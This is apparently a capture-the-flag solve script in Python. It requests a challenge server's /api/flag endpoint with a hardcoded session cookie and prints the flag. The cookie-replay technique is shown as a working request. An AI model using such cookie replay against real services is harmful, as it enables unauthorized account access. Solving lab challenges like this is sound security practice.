import json

import requests

URL = "http://chal1.gryphons.sg:8002/api/flag"
COOKIE_HEADER = "session=ca65fb7e5a62cc4133ea9cb3a486f910"


def main():
    resp = requests.get(URL, headers={"Cookie": COOKIE_HEADER})
    resp = json.loads(resp.text)
    print(resp.get("flag"))


if __name__ == "__main__":
    main()
